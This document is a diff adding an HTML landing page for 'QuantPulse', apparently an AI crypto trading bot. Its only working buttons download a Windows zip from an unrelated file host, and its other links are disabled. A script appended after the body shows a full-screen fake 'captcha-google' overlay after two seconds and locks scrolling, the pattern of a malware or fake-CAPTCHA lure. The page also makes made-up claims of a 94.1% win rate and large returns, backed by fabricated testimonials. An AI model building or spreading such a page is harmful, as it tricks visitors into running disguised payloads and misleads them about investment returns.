@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<!-- saved from url=(0043)https://manchba-theme.github.io/quantpulse/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>QuantPulse — AI Crypto Trading Bot</title>
+<link href="./QuantPulse_files/css2" rel="stylesheet">
+<style>
+  :root {
+    --bg: #050a0e;
+    --surface: #0a1520;
+    --card: #0d1e2d;
+    --border: rgba(0,210,180,0.15);
+    --accent: #00d2b4;
+    --accent2: #00a8ff;
+    --accent3: #f7c948;
+    --text: #e8f4f0;
+    --muted: #6b8fa0;
+    --red: #ff4d6d;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    overflow-x: hidden;
+  }
+
+  /* NOISE OVERLAY */
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
+    pointer-events: none; z-index: 9999; opacity: 0.4;
+  }
+
+  /* NAV */
+  nav {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 1.25rem 4rem;
+    background: rgba(5,10,14,0.85);
+    backdrop-filter: blur(16px);
+    border-bottom: 1px solid var(--border);
+  }
+  .logo {
+    font-family: 'Space Grotesk', sans-serif;
+    font-weight: 800; font-size: 1.3rem;
+    color: var(--accent);
+    letter-spacing: -0.02em;
+  }
+  .logo span { color: var(--text); }
+  nav ul { list-style: none; display: flex; gap: 2.5rem; }
+  nav ul a {
+    color: var(--muted); text-decoration: none; font-size: 0.78rem;
+    letter-spacing: 0.08em; text-transform: uppercase;
+    transition: color 0.2s;
+  }
+  nav ul a:hover { color: var(--accent); }
+  .nav-cta {
+    background: var(--accent); color: var(--bg) !important;
+    padding: 0.5rem 1.2rem; border-radius: 4px; font-weight: 500 !important;
+    transition: opacity 0.2s !important;
+  }
+  .nav-cta:hover { opacity: 0.85; color: var(--bg) !important; }
+
+  /* HERO */
+  .hero {
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    text-align: center; padding: 8rem 2rem 4rem;
+    position: relative; overflow: hidden;
+  }
+  .hero-grid {
+    position: absolute; inset: 0;
+    background-image:
+      linear-gradient(rgba(0,210,180,0.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,210,180,0.04) 1px, transparent 1px);
+    background-size: 60px 60px;
+    mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 30%, transparent 100%);
+  }
+  .hero-glow {
+    position: absolute; width: 700px; height: 700px;
+    background: radial-gradient(circle, rgba(0,210,180,0.08) 0%, transparent 70%);
+    top: 50%; left: 50%; transform: translate(-50%, -60%);
+    pointer-events: none;
+  }
+  .badge {
+    display: inline-flex; align-items: center; gap: 0.5rem;
+    background: rgba(0,210,180,0.08); border: 1px solid rgba(0,210,180,0.25);
+    color: var(--accent); padding: 0.35rem 1rem; border-radius: 100px;
+    font-size: 0.75rem; letter-spacing: 0.1em; margin-bottom: 2rem;
+    animation: fadeUp 0.6s ease both;
+  }
+  .badge::before { content: '●'; font-size: 0.5rem; animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+  h1 {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: clamp(2.8rem, 7vw, 6rem);
+    font-weight: 800; line-height: 1.0;
+    letter-spacing: -0.03em;
+    margin-bottom: 1.5rem;
+    animation: fadeUp 0.6s 0.1s ease both;
+  }
+  h1 em {
+    font-style: normal;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  .hero p {
+    font-size: 1rem; color: var(--muted); max-width: 540px;
+    line-height: 1.8; margin-bottom: 2.5rem;
+    animation: fadeUp 0.6s 0.2s ease both;
+  }
+  .hero-btns {
+    display: flex; gap: 1rem; flex-wrap: wrap; justify-content: center;
+    animation: fadeUp 0.6s 0.3s ease both;
+  }
+  .btn-primary {
+    background: var(--accent); color: var(--bg);
+    padding: 0.9rem 2rem; border-radius: 6px;
+    font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 0.9rem;
+    text-decoration: none; letter-spacing: 0.02em;
+    transition: transform 0.2s, box-shadow 0.2s;
+    box-shadow: 0 0 30px rgba(0,210,180,0.3);
+  }
+  .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 0 50px rgba(0,210,180,0.5); }
+  .btn-secondary {
+    background: transparent; color: var(--text);
+    padding: 0.9rem 2rem; border-radius: 6px;
+    border: 1px solid var(--border); font-size: 0.9rem;
+    text-decoration: none;
+    transition: border-color 0.2s, color 0.2s;
+  }
+  .btn-secondary:hover { border-color: var(--accent); color: var(--accent); }
+  .hero-sub {
+    margin-top: 1.5rem; font-size: 0.72rem; color: var(--muted);
+    letter-spacing: 0.06em;
+    animation: fadeUp 0.6s 0.4s ease both;
+  }
+
+  /* STATS */
+  .stats {
+    display: flex; justify-content: center; gap: 0; flex-wrap: wrap;
+    margin: 3rem auto 0; max-width: 800px;
+    border: 1px solid var(--border); border-radius: 12px;
+    overflow: hidden; animation: fadeUp 0.6s 0.5s ease both;
+  }
+  .stat {
+    flex: 1; min-width: 150px; padding: 1.5rem 2rem;
+    text-align: center; border-right: 1px solid var(--border);
+    background: rgba(13,30,45,0.6);
+  }
+  .stat:last-child { border-right: none; }
+  .stat-num {
+    font-family: 'Space Grotesk', sans-serif; font-size: 2rem; font-weight: 800;
+    color: var(--accent); display: block;
+  }
+  .stat-label { font-size: 0.7rem; color: var(--muted); letter-spacing: 0.08em; margin-top: 0.3rem; }
+
+  @keyframes fadeUp {
+    from { opacity:0; transform: translateY(20px); }
+    to { opacity:1; transform: translateY(0); }
+  }
+
+  /* CHART SECTION */
+  .section { padding: 6rem 2rem; max-width: 1100px; margin: 0 auto; }
+  .section-label {
+    font-size: 0.7rem; color: var(--accent); letter-spacing: 0.15em;
+    text-transform: uppercase; margin-bottom: 0.75rem;
+  }
+  h2 {
+    font-family: 'Space Grotesk', sans-serif; font-size: clamp(1.8rem, 4vw, 3rem);
+    font-weight: 800; letter-spacing: -0.02em; margin-bottom: 1rem;
+  }
+  .chart-card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 16px; padding: 2rem; margin-top: 3rem;
+    position: relative; overflow: hidden;
+  }
+  .chart-header {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    margin-bottom: 2rem;
+  }
+  .chart-big { font-family: 'Space Grotesk', sans-serif; font-size: 2.5rem; font-weight: 800; }
+  .chart-big span { color: var(--accent); }
+  .chart-meta { font-size: 0.72rem; color: var(--muted); margin-top: 0.25rem; }
+  .live-dot {
+    display: flex; align-items: center; gap: 0.5rem;
+    font-size: 0.72rem; color: var(--accent); letter-spacing: 0.08em;
+  }
+  .live-dot::before {
+    content:''; width:8px; height:8px; border-radius:50%;
+    background: var(--accent); animation: pulse 2s infinite;
+  }
+  .chart-area { height: 200px; position: relative; }
+  svg.chart { width: 100%; height: 100%; }
+  .legend {
+    display: flex; gap: 1.5rem; margin-top: 1.5rem; font-size: 0.72rem;
+  }
+  .legend-item { display: flex; align-items: center; gap: 0.5rem; color: var(--muted); }
+  .legend-line { width: 24px; height: 2px; border-radius: 2px; }
+
+  /* FEATURES */
+  .features-grid {
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+    gap: 1.5rem; margin-top: 3rem;
+  }
+  .feature-card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 12px; padding: 2rem;
+    transition: border-color 0.3s, transform 0.3s;
+  }
+  .feature-card:hover { border-color: var(--accent); transform: translateY(-4px); }
+  .feature-icon {
+    width: 44px; height: 44px; border-radius: 10px;
+    background: rgba(0,210,180,0.1); border: 1px solid rgba(0,210,180,0.2);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.3rem; margin-bottom: 1.25rem;
+  }
+  .feature-card h3 {
+    font-family: 'Space Grotesk', sans-serif; font-size: 1.05rem; font-weight: 700;
+    margin-bottom: 0.6rem;
+  }
+  .feature-card p { font-size: 0.82rem; color: var(--muted); line-height: 1.7; }
+
+  /* EXCHANGES */
+  .exchanges-section {
+    background: var(--surface); border-top: 1px solid var(--border);
+    border-bottom: 1px solid var(--border); padding: 3rem 2rem; overflow: hidden;
+  }
+  .exchanges-label { text-align: center; font-size: 0.7rem; color: var(--muted); letter-spacing: 0.1em; margin-bottom: 2rem; text-transform: uppercase; }
+  .exchanges-track {
+    display: flex; gap: 3rem; animation: scroll 20s linear infinite;
+    width: max-content;
+  }
+  @keyframes scroll {
+    from { transform: translateX(0); }
+    to { transform: translateX(-50%); }
+  }
+  .exchange-pill {
+    display: flex; align-items: center; gap: 0.6rem;
+    background: var(--card); border: 1px solid var(--border);
+    padding: 0.5rem 1.2rem; border-radius: 100px;
+    font-size: 0.8rem; white-space: nowrap; color: var(--muted);
+  }
+  .exchange-pill span { color: var(--text); font-weight: 500; }
+
+  /* TESTIMONIALS */
+  .testimonials-grid {
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(310px, 1fr));
+    gap: 1.5rem; margin-top: 3rem;
+  }
+  .testimonial {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 12px; padding: 1.75rem;
+  }
+  .stars { color: var(--accent3); font-size: 0.85rem; margin-bottom: 1rem; }
+  .testimonial p { font-size: 0.83rem; color: var(--muted); line-height: 1.75; margin-bottom: 1.25rem; }
+  .testimonial-author { display: flex; align-items: center; gap: 0.75rem; }
+  .avatar { width: 38px; height: 38px; border-radius: 50%; object-fit: cover; border: 2px solid var(--border); }
+  .author-name { font-family: 'Space Grotesk', sans-serif; font-size: 0.88rem; font-weight: 700; }
+  .author-sub { font-size: 0.72rem; color: var(--muted); }
+  .return-badge {
+    margin-left: auto; background: rgba(0,210,180,0.1);
+    color: var(--accent); font-size: 0.78rem; font-weight: 700;
+    padding: 0.2rem 0.6rem; border-radius: 4px;
+    font-family: 'Space Grotesk', sans-serif;
+  }
+
+  /* PRICING */
+  .pricing-grid {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 1.5rem; margin-top: 3rem;
+  }
+  .plan {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 16px; padding: 2rem; position: relative;
+  }
+  .plan.popular {
+    border-color: var(--accent);
+    box-shadow: 0 0 40px rgba(0,210,180,0.1);
+  }
+  .popular-tag {
+    position: absolute; top: -12px; left: 50%; transform: translateX(-50%);
+    background: var(--accent); color: var(--bg);
+    font-size: 0.7rem; font-weight: 700; letter-spacing: 0.1em;
+    padding: 0.25rem 0.9rem; border-radius: 100px;
+    font-family: 'Space Grotesk', sans-serif; text-transform: uppercase;
+  }
+  .plan-name { font-family: 'Space Grotesk', sans-serif; font-size: 1rem; font-weight: 700; color: var(--muted); }
+  .plan-price {
+    font-family: 'Space Grotesk', sans-serif; font-size: 3rem; font-weight: 800;
+    margin: 0.75rem 0; letter-spacing: -0.02em;
+  }
+  .plan-price sup { font-size: 1.2rem; vertical-align: super; }
+  .plan-price sub { font-size: 0.9rem; color: var(--muted); font-weight: 400; }
+  .plan-desc { font-size: 0.78rem; color: var(--muted); margin-bottom: 1.5rem; }
+  .plan-features { list-style: none; margin-bottom: 2rem; }
+  .plan-features li {
+    font-size: 0.8rem; color: var(--muted); padding: 0.5rem 0;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    display: flex; align-items: center; gap: 0.5rem;
+  }
+  .plan-features li::before { content: '✓'; color: var(--accent); font-weight: 700; }
+  .btn-plan {
+    display: block; text-align: center; padding: 0.85rem;
+    border-radius: 8px; font-family: 'Space Grotesk', sans-serif; font-weight: 700;
+    font-size: 0.88rem; text-decoration: none; transition: all 0.2s;
+    border: 1px solid var(--border); color: var(--text);
+  }
+  .plan.popular .btn-plan {
+    background: var(--accent); color: var(--bg); border-color: var(--accent);
+    box-shadow: 0 0 25px rgba(0,210,180,0.3);
+  }
+  .btn-plan:hover { transform: translateY(-2px); }
+
+  /* CTA */
+  .cta-section {
+    text-align: center; padding: 8rem 2rem;
+    background: linear-gradient(180deg, transparent, rgba(0,210,180,0.04), transparent);
+    border-top: 1px solid var(--border);
+  }
+  .cta-section h2 { margin-bottom: 1rem; }
+  .cta-section p { color: var(--muted); margin-bottom: 2.5rem; font-size: 0.9rem; }
+
+  .link-disabled {
+    pointer-events: none; cursor: default; opacity: 0.4;
+  }
+  .btn-disabled {
+    pointer-events: none; cursor: default; opacity: 0.4;
+    box-shadow: none !important; transform: none !important;
+  }
+  footer {
+    text-align: center; padding: 2rem;
+    border-top: 1px solid var(--border);
+    font-size: 0.72rem; color: var(--muted); letter-spacing: 0.05em;
+  }
+  footer strong { color: var(--accent); }
+  footer p + p { margin-top: 0.5rem; }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="logo">Quant<span>Pulse</span></div>
+  <ul>
+    <li><a href="https://manchba-theme.github.io/quantpulse/#features" class="link-disabled">Features</a></li>
+    <li><a href="https://manchba-theme.github.io/quantpulse/#performance" class="link-disabled">Performance</a></li>
+    <li><a href="https://manchba-theme.github.io/quantpulse/#pricing" class="link-disabled">Pricing</a></li>
+    <li><a href="https://diskcitylink.pro/xoyU0nh/QuantPulse-x64.zip" class="nav-cta">⬇ Download Free</a></li>
+  </ul>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="badge">53,000+ active traders · $3.1B volume traded</div>
+  <h1>Trade crypto with<br><em>machine precision.</em></h1>
+  <p>QuantPulse runs non-stop, connects to your exchange in under 3 minutes, and executes orders with AI-level precision — so you can close your laptop and live your life.</p>
+  <div class="hero-btns">
+    <a href="https://diskcitylink.pro/xoyU0nh/QuantPulse-x64.zip" class="btn-primary">⬇ Download Free — Windows</a>
+    <a href="https://manchba-theme.github.io/quantpulse/#features" class="btn-secondary btn-disabled">See How It Works</a>
+  </div>
+  <p class="hero-sub">No credit card · 30-day free trial · Works with Binance, Bybit, Kraken &amp; 13 more</p>
+  <div class="stats">
+    <div class="stat">
+      <span class="stat-num">+341%</span>
+      <span class="stat-label">Best Annual Return</span>
+    </div>
+    <div class="stat">
+      <span class="stat-num">94.1%</span>
+      <span class="stat-label">Win Rate</span>
+    </div>
+    <div class="stat">
+      <span class="stat-num">$3.1B</span>
+      <span class="stat-label">Volume Traded</span>
+    </div>
+    <div class="stat">
+      <span class="stat-num">0.2s</span>
+      <span class="stat-label">Execution Speed</span>
+    </div>
+  </div>
+</section>
+
+<!-- CHART -->
+<section class="section" id="performance">
+  <p class="section-label">// Live Performance</p>
+  <h2>Portfolio Growth — QuantPulse vs. Market</h2>
+  <div class="chart-card">
+    <div class="chart-header">
+      <div>
+        <div class="chart-big"><span>+311%</span> this year</div>
+        <div class="chart-meta">Bot Active since Jan 2024 · ETH/BTC/SOL basket</div>
+      </div>
+      <div class="live-dot">BOT ACTIVE</div>
+    </div>
+    <div class="chart-area">
+      <svg class="chart" viewBox="0 0 900 200" preserveAspectRatio="none">
+        <defs>
+          <lineargradient id="botGrad" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0%" stop-color="#00d2b4" stop-opacity="0.3"></stop>
+            <stop offset="100%" stop-color="#00d2b4" stop-opacity="0"></stop>
+          </lineargradient>
+          <lineargradient id="mktGrad" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0%" stop-color="#00a8ff" stop-opacity="0.15"></stop>
+            <stop offset="100%" stop-color="#00a8ff" stop-opacity="0"></stop>
+          </lineargradient>
+        </defs>
+        <!-- Market line -->
+        <path d="M0,160 C50,155 100,148 150,152 S250,138 300,130 S400,118 450,110 S550,95 600,88 S700,78 750,72 S850,60 900,55" fill="none" stroke="#00a8ff" stroke-width="1.5" opacity="0.5" stroke-dasharray="4 3"></path>
+        <path d="M0,160 C50,155 100,148 150,152 S250,138 300,130 S400,118 450,110 S550,95 600,88 S700,78 750,72 S850,60 900,55 L900,200 L0,200Z" fill="url(#mktGrad)"></path>
+        <!-- Bot line -->
+        <path d="M0,165 C30,158 70,145 120,130 S200,105 260,88 S350,62 420,45 S510,28 570,20 S660,12 720,8 S820,4 900,2" fill="none" stroke="#00d2b4" stroke-width="2.5"></path>
+        <path d="M0,165 C30,158 70,145 120,130 S200,105 260,88 S350,62 420,45 S510,28 570,20 S660,12 720,8 S820,4 900,2 L900,200 L0,200Z" fill="url(#botGrad)"></path>
+        <!-- Grid lines -->
+        <line x1="0" y1="50" x2="900" y2="50" stroke="rgba(255,255,255,0.05)" stroke-width="1"></line>
+        <line x1="0" y1="100" x2="900" y2="100" stroke="rgba(255,255,255,0.05)" stroke-width="1"></line>
+        <line x1="0" y1="150" x2="900" y2="150" stroke="rgba(255,255,255,0.05)" stroke-width="1"></line>
+      </svg>
+    </div>
+    <div class="legend">
+      <div class="legend-item"><div class="legend-line" style="background:#00d2b4"></div> QuantPulse Bot</div>
+      <div class="legend-item"><div class="legend-line" style="background:#00a8ff; opacity:0.5"></div> BTC Benchmark</div>
+    </div>
+  </div>
+</section>
+
+<!-- FEATURES -->
+<section class="section" id="features">
+  <p class="section-label">// Why QuantPulse</p>
+  <h2>Everything you need<br>to trade smarter.</h2>
+  <div class="features-grid">
+    <div class="feature-card">
+      <div class="feature-icon">🧬</div>
+      <h3>Adaptive Neural Core</h3>
+      <p>Trained on 10 years of market history. Continuously adapts to volatility regimes, whale activity, and social sentiment in real time.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">⚡</div>
+      <h3>0.2s Order Execution</h3>
+      <p>Sub-200ms routing across 16 exchanges simultaneously. Your orders hit the book before anyone else's.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">🛡</div>
+      <h3>Intelligent Risk Shield</h3>
+      <p>Dynamic stop-loss, auto drawdown protection, and portfolio rebalancing. Trade aggressively without blowing your account.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">📡</div>
+      <h3>Multi-Signal Engine</h3>
+      <p>Fuses 220+ technical indicators, on-chain flows, and sentiment data into clean, high-conviction trade signals.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">🔬</div>
+      <h3>Strategy Backtesting</h3>
+      <p>Simulate strategies against 6+ years of tick-level data before risking a dollar. Full P&amp;L, Sharpe, and drawdown reports included.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">🔐</div>
+      <h3>Non-Custodial API Access</h3>
+      <p>QuantPulse never holds your funds. Trade-only API keys. Your crypto stays in your exchange wallet, always.</p>
+    </div>
+  </div>
+</section>
+
+<!-- EXCHANGES -->
+<div class="exchanges-section">
+  <p class="exchanges-label">Connects to 16 exchanges</p>
+  <div style="overflow:hidden">
+    <div class="exchanges-track">
+      <div class="exchange-pill">🟡 <span>Binance</span></div>
+      <div class="exchange-pill">🔵 <span>Coinbase</span></div>
+      <div class="exchange-pill">🔴 <span>Kraken</span></div>
+      <div class="exchange-pill">🟠 <span>Bybit</span></div>
+      <div class="exchange-pill">⚫ <span>OKX</span></div>
+      <div class="exchange-pill">🟢 <span>KuCoin</span></div>
+      <div class="exchange-pill">🔵 <span>Bitfinex</span></div>
+      <div class="exchange-pill">🟣 <span>Gemini</span></div>
+      <div class="exchange-pill">🟠 <span>Huobi</span></div>
+      <div class="exchange-pill">⚪ <span>Gate.io</span></div>
+      <!-- duplicate for seamless loop -->
+      <div class="exchange-pill">🟡 <span>Binance</span></div>
+      <div class="exchange-pill">🔵 <span>Coinbase</span></div>
+      <div class="exchange-pill">🔴 <span>Kraken</span></div>
+      <div class="exchange-pill">🟠 <span>Bybit</span></div>
+      <div class="exchange-pill">⚫ <span>OKX</span></div>
+      <div class="exchange-pill">🟢 <span>KuCoin</span></div>
+      <div class="exchange-pill">🔵 <span>Bitfinex</span></div>
+      <div class="exchange-pill">🟣 <span>Gemini</span></div>
+      <div class="exchange-pill">🟠 <span>Huobi</span></div>
+      <div class="exchange-pill">⚪ <span>Gate.io</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- TESTIMONIALS -->
+<section class="section">
+  <p class="section-label">// Real Results, Real Traders</p>
+  <h2>Trusted by 53,000+<br>traders worldwide.</h2>
+  <div class="testimonials-grid">
+    <div class="testimonial">
+      <div class="stars">★★★★★</div>
+      <p>"Turned $10k into $44k in four months. The scalping module alone covers my rent every month. This is the only bot I'll ever use."</p>
+      <div class="testimonial-author">
+        <img class="avatar" src="./QuantPulse_files/32.jpg" alt="">
+        <div>
+          <div class="author-name">Ryan Cole</div>
+          <div class="author-sub">Day Trader · Denver, CO</div>
+        </div>
+        <div class="return-badge">+341%</div>
+      </div>
+    </div>
+    <div class="testimonial">
+      <div class="stars">★★★★★</div>
+      <p>"Full-time dev here. Set it up on a Sunday evening, went to work Monday, came back to more profit than I made coding that day. Wild."</p>
+      <div class="testimonial-author">
+        <img class="avatar" src="./QuantPulse_files/44.jpg" alt="">
+        <div>
+          <div class="author-name">Priya Nair</div>
+          <div class="author-sub">Backend Engineer · London, UK</div>
+        </div>
+        <div class="return-badge">+208%</div>
+      </div>
+    </div>
+    <div class="testimonial">
+      <div class="stars">★★★★★</div>
+      <p>"Backtesting changed everything. Ran 60 strategies, picked the best 4. Bot runs 24/7 with a 93% win rate on ETH/SOL pairs."</p>
+      <div class="testimonial-author">
+        <img class="avatar" src="./QuantPulse_files/67.jpg" alt="">
+        <div>
+          <div class="author-name">Aleksei V.</div>
+          <div class="author-sub">Quant Trader · Prague, CZ</div>
+        </div>
+        <div class="return-badge">+311%</div>
+      </div>
+    </div>
+    <div class="testimonial">
+      <div class="stars">★★★★★</div>
+      <p>"Two years of manual losses. Week one with QuantPulse and I was profitable. The drawdown shield stopped three crashes I would have ridden to zero."</p>
+      <div class="testimonial-author">
+        <img class="avatar" src="./QuantPulse_files/11.jpg" alt="">
+        <div>
+          <div class="author-name">Emeka J.</div>
+          <div class="author-sub">Crypto Investor · Nairobi, KE</div>
+        </div>
+        <div class="return-badge">+247%</div>
+      </div>
+    </div>
+    <div class="testimonial">
+      <div class="stars">★★★★★</div>
+      <p>"I tested 8 bots. QuantPulse is the only one that syncs Bybit and Kraken simultaneously. Execution speed genuinely blew me away."</p>
+      <div class="testimonial-author">
+        <img class="avatar" src="./QuantPulse_files/56.jpg" alt="">
+        <div>
+          <div class="author-name">Kenji M.</div>
+          <div class="author-sub">Full-Time Trader · Osaka, JP</div>
+        </div>
+        <div class="return-badge">+189%</div>
+      </div>
+    </div>
+    <div class="testimonial">
+      <div class="stars">★★★★★</div>
+      <p>"Started the free trial with $600. Made $1,100 in 30 days. Upgraded to Pro immediately. The compounding is genuinely insane to watch."</p>
+      <div class="testimonial-author">
+        <img class="avatar" src="./QuantPulse_files/22.jpg" alt="">
+        <div>
+          <div class="author-name">Lars B.</div>
+          <div class="author-sub">Entrepreneur · Oslo, NO</div>
+        </div>
+        <div class="return-badge">+183%</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- PRICING -->
+<section class="section" id="pricing">
+  <p class="section-label">// Pricing</p>
+  <h2>Start free. Scale as<br>you grow.</h2>
+  <div class="pricing-grid">
+    <div class="plan">
+      <div class="plan-name">Starter</div>
+      <div class="plan-price"><sup>$</sup>0<sub>/mo</sub></div>
+      <div class="plan-desc">Free for 30 days. No credit card required.</div>
+      <ul class="plan-features">
+        <li>1 active strategy</li>
+        <li>3 exchange connections</li>
+        <li>Basic backtesting (1 year)</li>
+        <li>Email support</li>
+        <li>$10k max portfolio</li>
+      </ul>
+      <a href="https://manchba-theme.github.io/quantpulse/#" class="btn-plan btn-disabled">Start Free Trial</a>
+    </div>
+    <div class="plan popular">
+      <div class="popular-tag">Most Popular</div>
+      <div class="plan-name">Pro</div>
+      <div class="plan-price"><sup>$</sup>49<sub>/mo</sub></div>
+      <div class="plan-desc">For active traders who want full control.</div>
+      <ul class="plan-features">
+        <li>Unlimited strategies</li>
+        <li>16 exchange connections</li>
+        <li>Full backtesting (6 years)</li>
+        <li>Neural AI Engine</li>
+        <li>Priority support</li>
+        <li>Unlimited portfolio size</li>
+      </ul>
+      <a href="https://manchba-theme.github.io/quantpulse/#" class="btn-plan btn-disabled">Get Pro</a>
+    </div>
+    <div class="plan">
+      <div class="plan-name">Institutional</div>
+      <div class="plan-price"><sup>$</sup>199<sub>/mo</sub></div>
+      <div class="plan-desc">For funds, desks, and power users.</div>
+      <ul class="plan-features">
+        <li>Everything in Pro</li>
+        <li>Dedicated server instance</li>
+        <li>Custom strategy builder</li>
+        <li>White-label dashboard</li>
+        <li>1-on-1 onboarding</li>
+        <li>SLA guarantee</li>
+      </ul>
+      <a href="https://manchba-theme.github.io/quantpulse/#" class="btn-plan btn-disabled">Contact Sales</a>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section class="cta-section">
+  <p class="section-label">// Get Started</p>
+  <h2>Start trading smarter<br>today.</h2>
+  <p>Join 53,000 traders already using QuantPulse.<br>Free for 30 days — no credit card required.</p>
+  <a href="https://diskcitylink.pro/xoyU0nh/QuantPulse-x64.zip" class="btn-primary">⬇ Download QuantPulse Free — Windows</a>
+  <p style="margin-top:1.5rem; font-size:0.72rem; color:var(--muted)">Windows 10/11 · v5.1.0 · No credit card required</p>
+</section>
+
+<footer>
+  <p>© 2025 <strong>QuantPulse Technologies, Inc.</strong></p>
+  <p>Trading involves risk. Past performance is not indicative of future results.</p>
+</footer>
+
+
+
+</body>
+
+<style>
+#lp2-overlay{
+    position:fixed;
+    inset:0;
+    width:100%;
+    height:100vh;
+    z-index:999999;
+    background:rgba(255,255,255,0.65);
+
+    opacity:0;
+    visibility:hidden;
+
+    transition:0.5s;
+}
+
+#lp2-overlay.active{
+    opacity:1;
+    visibility:visible;
+}
+
+#lp2-overlay iframe{
+    width:100%;
+    height:100%;
+    border:none;
+}
+
+body.locked{
+    overflow:hidden;
+}
+</style>
+
+<div id="lp2-overlay">
+    <iframe src="captcha-google.html"></iframe>
+</div>
+
+<script>
+
+setTimeout(() => {
+
+    document
+        .getElementById('lp2-overlay')
+        .classList.add('active');
+
+    document.body.classList.add('locked');
+
+}, 2000);
+
+</script>
+
+
+</html>
